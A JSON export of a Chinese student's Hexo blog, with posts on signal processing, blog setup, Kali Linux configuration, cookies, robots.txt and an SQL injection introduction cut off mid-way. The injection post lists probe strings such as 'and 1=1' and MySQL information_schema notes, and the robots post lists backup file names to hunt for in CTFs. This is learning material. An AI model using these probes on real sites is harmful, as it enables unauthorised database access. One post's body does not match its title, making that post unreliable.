{"pages":[],"posts":[{"title":"信号与系统学习笔记（一）","text":"摘要：信号与系统的一些概念理解 一、LTI系统时域分析 LTI系统定义:$$T(\\sum_{k=k_1}^{k_2} a_kx_k(t-t_k))= \\sum_{k=k_1}^{k_2} a_ky_k(t-t_k)$$ 卷积：设某系统冲激响应为$h(t)$,即$\\delta(t)\\Rightarrow h(t)$ $f(t)*T(\\delta(t))=T(f(t))$，看作f(t)经过了系统h(t),系统冲激响应为$T(\\delta(t))$。$u(t)$为$\\delta(t)$经过积分器 因果性：系统输出只与输入的当前值和以前值有关，充要条件$$h(t)=h(t)u(t)$$$$y(t)=\\int_0^\\infty h(\\tau)x(t-\\tau)d\\tau$$因$\\tau&gt;0$，所以$x(t-\\tau)$只用到了x(t)之前的值 记忆系统：输出与输入过去值有关 $x_1(t)=cosw_0t,x_2(t)=e^{-t},y_1(t)=x’(t),y_2(t)=x^2(t)$ 流图表示：子系统对调 二、LTI特征分析 CNN : $x[n]*h[-n]$,边缘补零，计算反向传播时可用卷积的思想 矩阵特征值与特征向量：$$A\\vec{x}=λ\\vec{x}$$把A看作某种对x的几何变换，若A对x有作用不变性，则x为A的特征向量，对应系数为特征值。 系统特征值与特征函数：$$T(s(u))=λs(u)$$s(u)/T可看作无穷维向量/矩阵 LTI系统特征值与特征函数：$$y(t)=e^{jwt}\\int_{-\\infty}^{\\infty} h(\\tau)e^{-jw\\tau}d\\tau=e^{jwt}H(w)$$$s(t)=e^{jwt}是任意LTI系统的特征函数，H(w)为对应系统的特征值$ 复指数表示$e^{jwt}$是真正的单频率信号，而cos和sin在频谱上都有两条谱线，所以只有傅里叶变换才能用于信号成分分析，才有明确的物理意义,是无可替代的。 $e^{st}$是一般意义的LTI特征函数，s=a+jw可表示任何复数，而傅里叶的s只能表示纯虚数(系数不同)，H(s)为特征值。是更复杂的信号，但不是有确定物理意义的单频信号，所以Laplace变换在做系统变换时比傅里叶变换有更广泛的性质，但不能用于信号成分分析。 三、傅里叶级数 $L^2[t_0,t_a]$上的完备正交基：$$f(t)=\\sum_{n=-\\infty}^{\\infty} c_n\\varphi_n(t)$$$$&lt;f(t),\\varphi_k(t)&gt;=\\sum_{n=-\\infty}^{\\infty} c_n&lt;\\varphi(t),\\varphi_k(t)&gt;=c_k&lt;\\varphi_k(t),\\varphi_k(t)&gt;$$ 三角形式傅里叶级数正交基：$$\\frac{1}{\\sqrt{2}},coswt,sinwt,…,cosnwt,sinnwt$$$$&lt;\\varphi_k(t),\\varphi_k(t)&gt;=\\frac{T}{2}$$ 指数形式傅里叶级数正交基：{e^{jnwt}}$$&lt;\\phi_n(t),\\phi_n(t)&gt;=&lt;e^{jnwt},e^{jnwt}&gt;=T$$ 周期延拓 四、傅里叶变换 加窗 $Sa(\\frac{wT}{2})=\\frac{sin\\frac{wT}{2}}{\\frac{wT}{2}}$主瓣是$\\frac{2\\pi}{T}$ –第一个过零点 峰值点在$w_0$和$-w_0$位置，可用于谱分析 局限：有限长的窗带来的频率分辨率问题 如果$\\frac{2\\pi}{T}&lt;&lt;w_0$,即矩形里包含了$cosw_0t$的很多周期，$T\\rightarrow\\infty$时Sa趋向冲击，没问题。但主瓣有宽度，如果信号有两个正弦分量$w_0$和$w_1$，如果$w_0$和$w_1$的距离小于主瓣宽度，两个Sa的主瓣会重合，叠加成一个Sa,可能只在$w_0$和$w_1$中间出现一个峰值，这时就无法分辨出两个频率。 为了解决这个问题，要求窗长尽可能大，分辨率才好。 周期信号的傅里叶变换 周期信号本来是没有傅里叶变换的,($f(t)\\notin L^1(-\\infty,\\infty)$)。但可以通过主周期得到主周期的傅里叶变换，再得到F级数的系数与主周期的F变换的关系，从而得到完整周期的F变换。其傅里叶变换是一系列冲激串。 –F级数是F变换的特例 只有有限长信号或其延拓成的周期信号才有傅里叶级数，$F_n$表明在某个频点有确定的信号强度，信号强度的密度对应着冲激，即傅里叶变换。 高斯对高斯，冲激对冲激 五、离散信号傅里叶变换 离散信号的频率在离散信号中，w和$w+2\\pi k$不可区分，因为只看离散点n(整数)的值而非连续的t，如$sin((2\\pi k+w)n+\\phi)=sin(wn+\\phi)$。所以角频率主值取$[-\\pi,\\pi]$或$[0,2\\pi]$ 注意，在离散信号中，$\\pi$为最高频，0和$2\\pi$为最低频。(0和$2\\pi$不可区分) 正弦离散信号的周期$x[n]=cos(w_0n+\\phi)$,令$x[n+N]=x[n]$，则周期$N=\\frac{2\\pi}{w_0}k$,k取令N为整数的最小整数 注意：角频率越大，周期越小的结论不再成立 以N为周期的离散信号中，可区分的正弦频率数目只有N个 $$w_k=\\frac{2\\pi}{N}k,k=0,1,…,N-1$$ 离散信号的傅里叶级数DFS DTFT","link":"/2022/04/05/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"如何个性化定制个人博客","text":"摘要：一篇基于yarn,Hexo和Icarus主题的个性化定制个人博客的教程。以如何把Hexo默认主题更改为酷炫的赛博朋克风格为例，介绍了一些Icarus主题的功能强大的插件 前言搭建完博客后，可以定制个人的博客风格。本文将基于Icarus主题搭建赛博朋克风格的博客。 1.安装和配置必要依赖yarn安装直接使用npm命令即可，这样的前提是你已经安装了 Node.js 12node-v #检查是否具有node.jsnpm install -g yarn #安装yarn 安装完成之后可以通过yarn -v命令检测是否安装成功。然后我们设置一下yarn库的镜像源： 1yarn config set npmRegistryServer https://registry.npm.taobao.org 2.更换为 Icarus 主题我们查看 Icarus 文档,里面有英文文档也有中文文档。更换主题主要有两种方式，一种是使用 npm 安装主题的方式，另一种是下载源码放到 theme 文件夹的方式。简单起见，我们采用 npm 的方式： 1yarn add hexo-theme-icarus 使用 hexo 命令修改主题为 Icarus: 1npx hexo config theme icarus hexo g生成后，本地调试下，报错： 提示缺少依赖，就按照指示按照依赖： 1yarn add bulma-stylus@0.8.0 hexo-pagination@^2.0.0 hexo-renderer-inferno@^0.1.3 再次生成并本地调试，成功出现 Icarus 主题要更换为赛博朋克风格主题，只需在Hexo文件夹的_config.icarus.yml修改 12# Icarus theme variant, can be &quot;default&quot; or &quot;cyberpunk&quot;variant: cyberpunk 再次生成并本地调试，成功出现赛博朋克主题，用hexo d上传至服务器 3.自定义配置修改配置文件 _config.yml 和 _config.icarus.yml ，配置网站相关信息。主要包括 logo、favicon、navbar 的 menu 和 links、footer、donates、widgets。可参照Icarus用户指南 - 主题配置 widgets即为左侧和右侧的挂件，profile widgets是个人资料卡，里面的social_links的icon是基于fontawesome的。subscribe_email、adsense 都用不上，可以删掉。 Icarus还提供了分享和评论插件。设置参照Icarus用户指南 - 分享按钮和Icarus用户指南 - 用户评论插件,效果如下： 注意：评论插件需在github上创建一个新的repo来放置，且配置完成后要在个人主页上登录github进行初始化评论。 Icarus支持数学公式显示，只需在主题配置文件下修改； 12mathjax: enable: true 若无法显示，可能是没安装hexo-math： 1npm install hexo-math --save 4.配置样例文章注意头部配置文件相关信息，在新版 Icarus 中头图需要额外配置 cover 选项，如下： 1234567891011121314---title: 如何个性化个人博客date: 2022-04-08 23:05:51categories:- CS- Blogtags:- Hexo- Icarus- Blogtoc: truethumbnail: 'https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220409013048.png' # 缩略图cover: 'https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220409013048.png' # 头图--- 5.主页展示文章缩略首页应该展示更多的文章，我们想让用户在主页看文章缩略内容，只需用markdown在文章的md文件中添加 即可，文章会自动从插入的位置截断，也就是说在博客中只显示之前的内容。 添加完之后，会出现“阅读更多”的按钮。 6.怎么样让文章两栏展示为了有效利用空间，希望文章页能够不同于主页的三栏布局，使用两栏布局。或者想在文章页面使用不同于主页的挂件。此时我们需要在_config.yml同级文件夹添加 _config.post.yml 文件，参照配置文件与优先级 配置成两栏布局： 123456789101112widgets: - # Where should the widget be placed, left sidebar or right sidebar position: right type: toc # Whether to show the index of each heading index: false # Whether to collapse sub-headings when they are out-of-view collapsed: true # Maximum level of headings to show (1-6) depth: 3 7.部署到 GitHub Pages 上参照官网描述,在上一篇文章中已经部署。 注意在 _config.yml 中配置你的 GitHub Pages 对应的仓库地址，如： 1234deploy: type: git repository: git@github.com:zhangsx19/zhangsx19.github.io.git branch: master 总结Icarus 主题提供了丰富且功能强大的插件，能让我们实现炫酷的主题，从而个性化定制个人博客。 参考资料 Yarn 的安装与使用 轻松搭建赛博朋克风格个人博客 —— Hexo 篇｜技术点评","link":"/2022/04/08/%E5%A6%82%E4%BD%95%E4%B8%AA%E6%80%A7%E5%8C%96%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"用HEXO从零开始搭建个人博客","text":"摘要：一篇如何使用Github Pages和Hexo搭建自己的个人博客的教程，里面介绍了如何使用和配置Hexo框架，如何将Hexo部署到自己的Github项目中，如何注册域名以及将自己的域名关联到Github Pages上。 前言一直想搭建一个属于自己的博客，一方面可以记录自己的学习成果和技术理解，一方面在面试中也是加分项。在此记录下首次搭建个人博客的踩坑之路。 一、技术选型1.为什么选择HEXO？博客生成技术分为静态和动态网站生成，考虑到静态相比动态生成，有如下优点： 1.内容存储为平面文件，因此不需要数据库 2.静态网站不需要动态服务器端处理 3.静态网站比动态网站超快，因为它们不需要服务器端处理或数据库访问 4.静态网站比任何动态网站都更安全，因为可以利用的安全漏洞更少 5.缓存静态文件比缓存动态页面更有效 所以本次使用静态生成，目前主流静态站点生成器有：Hexo和Hugo等，Hugo是一个用Go语言构建的静态站点生成器，其搭建较简单但可扩展性差。而Hexo是基于Node的开源静态生成器，有以下优点： 1.构建速度快 2.使用一个部署命令可部署到Github或其他任何主机 3.强大的Markdown支持 4.高度可扩展 5.丰富的开源主题与插件 基于此，本次采用Hexo进行博客搭建。 2.为什么选择Github-PagesGithub Pages是用户编写的、托管在github上的静态网页,优点有：1.可以绑定你的域名2.简单快捷，可以提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。 二、搭建步骤1.安装和配置必要框架Git安装去Git官网根据你的电脑参数，下载对应版本并安装。安装完成后在桌面或任意文件夹点击鼠标右键，会有Git GUI Here和Git Bash Here两个按钮，一个是图形界面的Git操作，一个是命令行。一般选择命令行操作Git Bash Here。 Node.js安装到官网根据电脑参数下载安装文件并执行，无脑点下一步即可，无需配置环境变量，完成安装。 Hexo安装与配置桌面右键鼠标，点击Git Bash Here，输入以下命令即可安装。 12npm install hexo-cli -g npm install hexo-deployer-git --save 第一句是安装hexo，第二句是安装hexo部署到git page的deployer，两个都需要安装。如下图即安装完成。 安装完成后，根据自己喜好创建一个Hexo文件夹(如D:\\Blog\\Hexo),进入创建的文件夹目录，右键鼠标，点击Git Bash Here，执行命令: 1hexo init Hexo 将在指定文件夹中新建所需要的初始化配置文件，如下图 123hexo clean #清理缓存hexo generate #进行渲染 简写为 hexo ghexo server #部署到本地(调试使用) 简写为 hexo s 终端中会出现INFO Hexo is running at http://localhost:4000/。此时在浏览器输入网址http://localhost:4000，即可查看本地的效果，如下图 此时个人博客初步创建成功，但这是本地调试用的，其他人看不到(调试完毕后记得在git命令行中Ctrl+C来停止运行，不然下次就进不去了)，所以接下来我们需要把它部署到服务器上，从而让每个人都能通过互联网访问到我们的个人博客。 2.将博客部署到Github-Pages上在Github中创建github.io项目代码库注意repository的名字必须是：你的用户名.github.io 将本地的Hexo文件更新到Github的库中打开创建的Hexo文件夹，修改配置文件_config.yml以后的大部分操作都会在_config.yml中进行，它是站点的配置文件。在Hexo文件夹下,右键鼠标，点击Git Bash Here,执行命令： 1234hexo clean #清理缓存hexo generate #进行渲染 简写为 hexo ghexo server #部署到本地 简写为 hexo s 可省略hexo deploy #部署到git服务器 简写为 hexo d 以上代码为了简单后续统称为“更新代码”，即每次在本地进行了操作（如修改了配置、新写或修改了博客文章等),都需执行“更新代码”来同步到git服务器，从而让别人浏览到。其中hexo s命令也可省略，即如果没有本地调试需求，可以直接commit到git服务器。如报错ERROR Deployer not found: git,deployer没有安装成功，需要执行如下命令再安装一次： 1npm install hexo-deployer-git --save 再执行hexo g -d，出现INFO Deploy done: git即部署成功，在浏览器上输入Github Pager为我们生成的外链：你的用户名.github.io（如zhangsx19.github.io），即可看到自己的博客，且每个人都可通过此地址访问到。 三、写第一个博客搭好博客后，进入创建的Hexo文件夹，使用如下命令来新建文章： 1hexo new post “文章名字” #简写为 hexo n &quot;文章名字&quot; 建立好的文章存储在./source/_posts 中，你可以在本地用markdown语法编辑内容。编辑完成后还需要执行“更新代码” 123hexo cleanhexo ghexo d #可与hexo g合并为 hexo d -g 再刷新浏览器就可看到新文章。如下图: 四、将域名关联到Github Pages(可选）1.域名购买如果不想用github提供的免费域名，可以选择在阿里云上买一个属于自己的域名，然后将自己域名绑定到自己的Github Pages博客上 2.域名解析购买域名并实名认证后，需要把域名解析到我们的博客中，在阿里云的域名控制台找到域名右侧对应的解析按钮。点击添加解析，然后按照如下填写添加解析，记得把记录值替换成你自己的博客地址。 之后记得启用该记录。 3.博客配置购买域名后，在Hexo\\source 文件夹下创建文件 CNAME （通过记事本创建和打开，没有后缀名），内容为你的域名，如sx-zhang.top。 然后在Hexo文件夹执行“更新代码”。 12hexo cleanhexo g -d 就可以通过购买的域名访问博客了。如果不能访问可能是因为运营商DNS缓存问题。等几分钟就可以。 五、实现https协议(可选）购买的域名是http协议，如果用google浏览器或者Safari，会提示网站不被信任，只有你点击仍要继续才会展示你的博客。而使用https协议就不会有这个问题，有以下方法： 购买证书 使用免费CA证书。腾讯云阿里云都有提供。不过有时间限制 使用CDN进行反向代理 因为我们使用的github Page是不支持上传证书的，所以此次使用第三种:通过CDN配置反向代理。 原理Cloudflare 提供DNS解析服务，而且速度很快。它提供了免费的https服务(但不是应用SSL证书)。实现模式是，用户到CDN服务器的连接为https，而CDN服务器到GithubPage服务器的连接为http，即在CDN服务器那里加上反向代理。 步骤去官网注册后添加购买的域名，进入DNS解析界面填入如下解析： 其中前两个是使你的域名指向github的服务器地址(github文档中给的)，最后CNAME记录指向的是github仓库域名username.github.io。一定要严格按照这个来配置。记录下cloudflare给你的DNS解析服务器，就在上一步那个页面下边，用这个记录去把阿里云的DNS解析服务器替换掉，同时删掉阿里云里面的DNS解析记录，因为只靠clouleflare来解析DNS。 回到clouldflare上面选择SSL/TLS的Overview选项，然后选择Full或者是Flexible。再在Edge Certificates里打开always use HTTPS开关。此时即可用https访问个人博客啦！ 坑点：博文不能有非https的链接，比如图片图床不能是https的，或者评论插件不支持https等 总结本文简单介绍了如何用Hexo框架从零开始搭建属于自己的个人博客，以及如何把购买的域名关联到Github Pages,并利用CDN配置反向代理实现https协议。搭建完博客后，接下来就是要个性化个人博客和学习Markdown来写博客了。 想了解更多，欢迎来参观我的博客：Zhangsx’s Blog 和github：zhangsx19 参考资料 hexo搭建博客以及域名解析分析 2018，你该搭建自己的博客了！ 关于HEXO搭建个人博客的点点滴滴","link":"/2022/04/04/%E7%94%A8HEXO%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"kali虚拟机安装与配置","text":"摘要：本文实现了利用虚拟机从零开始安装和配置kali系统 前言做网络安全，一个好的操作系统是必不可少的，而kali则是最常用的用于渗透测试的操作系统。为了方便测试和还原，我选择用vmware安装kali系统的虚拟机，安装和配置过程踩了不少坑，特此记录。 一.安装和配置必要依赖VMWARE虚拟机即电脑中的电脑。每个虚拟机都有独立的CMOS、硬盘和操作系统，可以像使用实体机一样对虚拟机进行操作。在安装时，勾选增强型 如果是第一次安装，启动的时候会要求打开虚拟化的设置。可参照启动BIOS的虚拟化设置 123仅主机模式：本机与新安装的虚拟机互通，但是虚拟机与其他的虚拟机互通不了。NAT模式：本机与新安装的虚拟机互通，虚拟机与虚拟机之间也互通，但是外界访问不了你。桥接模式：本机与新安装的虚拟机互通，虚拟机与虚拟机之间也互通，外界也能访问你这个虚拟机。 快照是虚拟机最强大的功能，能够让你保留虚拟电脑的某一时刻。 –&gt; 存档的意思 远程连接首先要开启允许远程控制(Kali不像windows,默认是没有远程桌面服务的,如果需要的话得自己安装)，然后在主机运行栏输入mstsc，输入虚拟机ipv4地址(ipconfig查看,kali是ifconfig)。 Kalikali是基于Debian的Linux发行版本，前身是BackTrack，专门用于渗透测试和安全审计。特点： 123包含600+安全工具开源免费有图形化界面的Linux系统 简单来说，kali就是用工具对目标进行渗透测试的。 下载地址,推荐下载Kali Linux 64-Bit VMware VM(这个版本是专门用于Vmware)。(网页查找VMWARE即可)。解压后找到vmx文件用虚拟机打开。可以选择编辑虚拟机设置，把内存调高到4G。打开后选择我已移动该虚拟机(点复制有些工具可能会路径错误)。 还可以把快照的自动保护功能打开，即自动存档的意思。 开机输入默认的账户和密码，都为kali（2021.1以后和之前的老版本不同，只是一个普通用户,老版本为root用户，账户和密码均为root），最好拍个初始状态的快照，因为做出修改后虚拟机会自动保存，注意快照左下角显示需要等待一定时间。 如何删除虚拟机：选中要删除的虚拟机操作系统，单击右键，选择 “管理” 选项。然后在选择 “从磁盘中删除” 选项即可删除该虚拟机操作系统 二、设置root用户为了以后使用更加方便，这里我们可以直接更改root用户的密码，后续就可以用root用户登陆了切换到root权限：sudo su 打开终端，输入命令：sudo passwd root 提示输入kali用户的密码，kali的默认密码为kali。接下来输入新密码，输入两遍新密码之后，root用户的密码成功修改。接下来可以重启kali 用root用户登录，并且输入上面步骤的新密码。重启命令：sudo reboot 三、设置中文（1）设置中文编码命令：dpkg-reconfigure locales 进入选择语言的图形化界面之后，（空格是选择，Tab是切换）选中 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8、zh_CN.GBK，图为初始界面，界面下选项，可以下拉，排序为从a-z排序。 回车之后，会让你设置默认编码，设置成zh_CN.UTF-8，回车。 注意：重启后要选择保留旧的名称，方便以后的配置。 （2）配置源不然下载软件的时候会比较慢，源可以理解为软件的仓库 做一下备份：sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup,如果以后源列表无意毁坏了，可以恢复一下:sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list 打开源文件：vim /etc/apt/sources.list。此时文件里面只有一个官方源，建议注释，不然还是会使用这个源。vi和vim都是Linux中的编辑器，vi使用于文本编辑,但是vim适用于coding和文本。 推荐源： 12345# kali官方源deb http://http.kali.org/ moto main non-free contribdeb-src http://http.kali.org/ moto main non-free contribdeb http://security.kali.org/ moto/updates main contrib non-freedeb-src http://security.kali.org/ moto/updates main contrib non-free 按i 进入插入模式，可以把上述的源都复制进去。然后按esc，再按shift+冒号，输入wq保存。 接着更新源，命令： 12345apt-get update #更新一下源sudo apt-get dist-upgrade -y #更新系统和软件#这里最好快照一下sudo apt-get autoremove -y #清理安装包reboot #重启 更新源时，如果出现以下错误，换个源 如果中间出错了，会提示执行apt --fix-broken install,再执行即可。 （apt-get，是一条linux命令，适用于deb包管理式的操作系统） 更新好就会有这个，选择yes （3）安装中文输入法命令：apt-get install fcitx fcitx.googlepinyin,重启后在搜索框搜索“fcitx”,点击“fcitx配置”程序，将Google输入法调在第一位即可 切换：ctrl+空格 （4）安装中文字体如果使用chrome浏览器,发现中文显示全是方框。而系统自带的firefox却没有这个问题,原因是系统缺少相应的字体库支持 命令：sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy安装完后输入sudo reboot重启，记得在登陆界面选择中文，再登陆,则汉化完成。 5）浏览器改为中文kali默认浏览器是网络浏览器，点击search for more languages;select a language to add,找到Chinese(China),点击add。 6）浏览器安装插件在扩展和主题里，安装omega代理插件，应用选项如下 三、安装JDK1.8并且切换(不一定要切换)kali默认的java版本是，版本过高不太稳定，较稳定的版本是JDK1.8。 先把包拖进虚拟机 12解压安装包：tar -axvf jdk-8u311-linux-x64.tar.gz将文件移动到opt目录再改名为java：mv ./jdk1.8.0_311 /opt/java 编辑：vi /etc/profile export JAVA_HOME=/opt/java export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JRE_HOME=$JAVA_HOME/jre 1234567更新：source /etc/profile更新完后会出现#,关掉终端，再打开一个命令行切换：update-alternatives --install /usr/bin/java java /opt/java/bin/java 3update-alternatives --config java #切换回去也是这条命令选择1java -version #查看版本 四、踩过的坑1.更新时卡住了，只能退出重来，结果提示12E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it? 这些错误提示一般都是因为某些程序在系统后台进行着某些 apt 操作，因此锁定了 apt 数据库，所以暂时不能进行 apt 操作。 遇到这种情况，一般我们只需要安静地等待几分钟。直到当前的更新、安装或卸载任务完成后，锁就会自动释放，然后就可以进行 apt 操作了。 非正常情况下，比方说你等了好多个几分钟锁都还没有被释放，你就要看看是不是该进程由于某些原因而卡住了并且一直占用着锁。如果是的话，那你只能干掉这个进程，然后删除该锁定了 首先，我们先找出是哪个进程占用了锁文件 /var/lib/dpkg/lock 1sudo lsof /var/lib/dpkg/lock-frontend #sudo lsof 文件 我们可以从结果中看到，该进程的 PID 为 1548。接着，kill 掉这个进程 1sudo kill -9 1548 然后你就可以放心地删除锁文件 123sudo rm /var/lib/dpkg/locksudo rm /var/cache/apt/archives/lock #删除缓存目录下的锁文件sudo dpkg --configure -a 2.更新源时release仓库过期首先确保虚拟机与主机的时间是同步的(虚拟机-设置-选项-VMWARE TOOLS)，如果还是不行，可能是长时间挂着虚拟机，时间不同步了，只需重启下即可 总结经历千辛万苦终于安装和配置成功，接下来就开始渗透的学习了。 参考资料1.kali2021.4软件更新以及输入法安装 2.更新卡住解决_Linux安装软件时90%的人会遇到这个报错，如何解决？","link":"/2022/04/10/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"title":"http中的cookie","text":"摘要：本文介绍了http中的cookie是什么 前言做XCTF时遇到了cookie,特此记录。 一、cookie的定义Cookie，有时也用其复数形式 Cookies。Cookie是由服务器端生成，发送给User-Agent,浏览器会将Cookie的key/value保存到某个目录下的文本文件内，如网站根目录下的cookie.php,下次请求同一网站时就发送该Cookie给服务器 一句话，cookie=用户身份 二、cookie的作用HTTP cookie就是服务器端发送给浏览器端的一小部分数据，浏览器接收到这个数据之后，可以存起来自己用，也可以在后续发送到server端进行一些数据的校验。 Cookie诞生的最初目的是为了存储web中的状态信息，以方便服务器端使用。比如判断用户是否是第一次访问网站。 又如通过在cookies中存储一些有用的数据，可以将无状态的HTTP协议变成有状态的session连接，或者用来保存登录的权限，下次不用密码即可登陆，非常有用。一般来说，cookies用在三个方面： 123- session的管理，用来保存登录状态，从而让HTTP请求可以带上状态信息。- 用户自定义的设置，这些用户特殊的字段，需要保存在cookies中。- 跟踪用户的行为信息。 在很久很久以前，还没有现代浏览器的时候，客户端的唯一存储就是cookies，所以cookies也作为客户端存储来使用的，但是有了现代的浏览器之后，一般是建议把客户端存储的数据放到其他存储方式中。为什么呢？因为每次请求cookies中的数据会自动带上，并且发送到server端，所以如果cookies中存储了太多的数据，就会导致服务器性能的下降。 三、cookie注入四、解题 总结学习了http中的cookies 参考资料 HTTP系列之:HTTP中的cookies 好好了解一下Cookie(强烈推荐)","link":"/2022/04/09/http%E4%B8%AD%E7%9A%84cookie%E4%B8%8Ecookie%E6%B3%A8%E5%85%A5/"},{"title":"Robots协议是什么","text":"摘要：本文介绍了Robots协议是什么，以及如何利用urllib的robotparser模块，实现网站Robots协议的分析 前言做XCTF时遇到了Robots协议,特此记录。 一、前置内容1.区分进程和线程进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位） 线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）。单线程与多线程，都是指在一个进程内的单和多。 12345- 进程是一个工厂，工厂有它的独立资源- 工厂之间相互独立- 线程是工厂中的工人，多个工人协作完成任务- 工厂内有一个或多个工人- 工人之间共享空间 12345- 工厂的资源 -&gt; 系统分配的内存（独立的一块内存）- 工厂之间的相互独立 -&gt; 进程之间相互独立- 多个工人协作完成任务 -&gt; 多个线程在进程中协作完成任务- 工厂内有一个或多个工人 -&gt; 一个进程由一个或多个线程组成- 工人之间共享空间 -&gt; 同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等） 2.浏览器是多进程的浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存） 简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。如果再多打开一个Tab页，进程正常会+1以上 注意：在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，可以在Chrome任务管理器中看到，有些进程被合并了 （所以每一个Tab标签对应一个进程并不一定是绝对的） 3.浏览器有哪些进程1234-浏览器主进程：只有一个，主要控制页面的创建、销毁、网络资源管理、下载等。-浏览器渲染进程(浏览器内核)：每个Tab页对应一个进程，互不影响。-第三方插件进程：每一种类型的插件对应一个进程，仅当使用该插件时才创建。-GPU进程：最多一个，用于3D绘制等。 4.输入网址并解析这里我们只考虑输入的是一个URL结构字符串，如果是非 URL 结构的字符串，则会用浏览器默认的搜索引擎搜索该字符串。 输入URL后，浏览器会解析出协议、主机、端口、路径等信息，并构造一个HTTP请求。(两次命中看缓存) 123-浏览器发送请求前，根据请求头的expires和cache-control判断是否命中（包括是否过期）强缓存策略，如果命中，直接从缓存获取资源，并不会发送请求。如果没有命中，则进入下一步。-没有命中强缓存规则，浏览器会发送请求，根据请求头的If-Modified-Since和If-None-Match判断是否命中协商缓存，如果命中，直接从缓存获取资源。如果没有命中，则进入下一步。-如果前两步都没有命中，则直接从服务端获取资源。 5.HSTS由于安全隐患，会使用 HSTS 强制客户端使用 HTTPS 访问页面。详见：你所不知道的 HSTS。当你的网站均采用 HTTPS，并符合它的安全规范，就可以申请加入 HSTS 列表，之后用户不加 HTTPS 协议再去访问你的网站，浏览器都会定向到 HTTPS。无论匹配到没有，都要开始 DNS 查询工作了。 6.DNS域名解析在发起http请求之前，浏览器首先要做去获得我们想访问网页的IP地址，(如百度的IP是202.108.22.5，在浏览器中输入https://baidu.com和http://202.108.22.5是等价的）浏览器会发送一个UDP的包给DNS域名解析服务器 7.备份文件名常用的备份文件名有.git,.svn,.swp,.~,.bak,.bash_history 二、robots协议Robots协议也称作爬虫协议、机器人协议，它的全名叫作网络爬虫排除标准（Robots Exclusion Protocol），用来告诉爬虫和搜索引擎哪些页面可以抓取，哪些不可以抓取。它通常是一个叫作robots.txt的文本文件，一般放在网站的根目录下。 当搜索爬虫访问一个站点时，它首先会检查这个站点根目录下是否存在robots.txt文件，如果存在，搜索爬虫会根据其中定义的爬取范围来爬取。如果没有找到这个文件，搜索爬虫便会访问所有没有被口令保护的页面。 如下是一个robots.txt的样例： 123User-agent: *Disallow: /Allow: /public/ 上面的User-agent描述了搜索爬虫的名称，这里将其设置为*则代表该协议对任何爬取爬虫有效。 Disallow指定了不允许抓取的目录，比如上例子中设置为/则代表不允许抓取所有页面。 三、robotparser以简书为例，首先创建RobotFileParser对象，然后通过set_url()方法设置了robots.txt的链接。接着利用can_fetch()方法判断了网页是否可以被抓取。 12345from urllib.robotparser import RobotFileParserrp = RobotFileParser()rp.set_url('http://www.jianshu.com/robots.txt')rp.read()print(rp.can_fetch('*', 'http://www.jianshu.com/search?q=python&amp;page=1&amp;type=collections')) 四、解题1.思路1 2.思路2利用direarch目录扫描工具暴力破解，扫到有robots.txt总结学习了robots协议和python爬虫的robotparser类。 参考资料 从输入URL开始建立前端知识体系 【Python3网络爬虫开发实战】3.1.4-分析Robots协议 从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理","link":"/2022/04/09/Robots%E5%8D%8F%E8%AE%AE%E6%98%AF%E4%BB%80%E4%B9%88/"},{"title":"Robots协议是什么","text":"摘要：本文介绍了Robots协议是什么，以及如何利用urllib的robotparser模块，实现网站Robots协议的分析 前言做XCTF时遇到了Robots协议,特此记录。 一.安装和配置必要依赖 总结Icarus 主题提供了丰富且功能强大的插件，能让我们实现炫酷的主题，从而个性化定制个人博客。 参考资料 Yarn 的安装与使用 轻松搭建赛博朋克风格个人博客 —— Hexo 篇｜技术点评","link":"/2022/04/09/%E6%A8%A1%E6%9D%BF/"},{"title":"sql注入和sqlmap","text":"摘要：本文介绍了sql注入的原理和常用的开源自动化sql注入工具–sqlmap 前言sql注入是最常用的注入手段，被称为漏洞之王，是学习web安全不可或缺的。 一.sql注入原理1.什么是sql注入什么是注入？一句话定义：把用户输入的数据当做代码执行 sql注入；用户在网页输入的内容被浏览器当做数据库语句进行执行。 原因是服务端在接收来自客户端的查询参数后，未对查询参数进行严格的过滤。导致恶意用户可在查询参数中插入恶意的sql语句来查询数据库中的敏感信息，最终造成数据库信息泄露。这也是安全防护的方法 关键点：我们输入的内容一定要是数据库语句。 我们输入的地方有哪些: 121.网站给我们提供的框框（比如搜索框）2.网址的参数的值的地方。 2.mysql常用语法mysql和sql server都是最常用的数据库语言，虽然语法不同但特别相似。其中mysql是开源的，sql server是微软开发的。 12345库：information_schema 是Mysql数据库里面一个自带的库的库名，存储着你所有的数据库名、表名和列名。表：schemata,tables，columns;schemata存库名，tables存放都是表名，columns都是列名列：table_name(存储的表名)， table_schema（存储的是库名），column_name（存储的是列名）limit m,n # 查询m+1行的n条数据。 m+1行开始查询多少条？如limit 0,1group_concat #多行数据用一行显示 大概的demo长这样： 3.显错注入-联合查询（Mysql数据库）的基本流程12345678910111213141516171819202122 1.判断网站是否存在数据库注入漏洞 and 1=1 网页有内容 and 1=2 